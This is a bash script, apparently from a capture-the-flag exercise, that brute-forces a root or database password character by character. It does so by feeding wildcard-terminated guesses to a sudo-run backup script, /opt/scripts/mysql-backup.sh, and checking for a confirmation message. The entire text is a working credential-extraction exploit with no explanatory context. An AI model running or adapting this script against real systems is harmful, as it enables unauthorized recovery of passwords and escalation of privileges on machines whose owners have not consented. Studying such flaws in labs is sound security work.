#!/bin/bash

list_char="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0987654321"
found=0
password=""
length=${#list_char}
counter=0

while [[ ! $found -eq 1 ]]
do
        for ((i = 0; i < length; i++)); do
                char="${list_char:i:1}"
                command=$(echo "${password}${char}*" | sudo /opt/scripts/mysql-backup.sh 2>/dev/null)
                if [[ "$command" == *"Password confirmed!"*  ]]
                then
                        password="${password}${char}"
                        printf "${password}\n"
                        counter=0
                        break
                fi
                (( counter++ ))
        done

        if [[ $counter -eq $length  ]]
        then
                found=1
        fi
done

printf "\nThe Password is : $password\n"
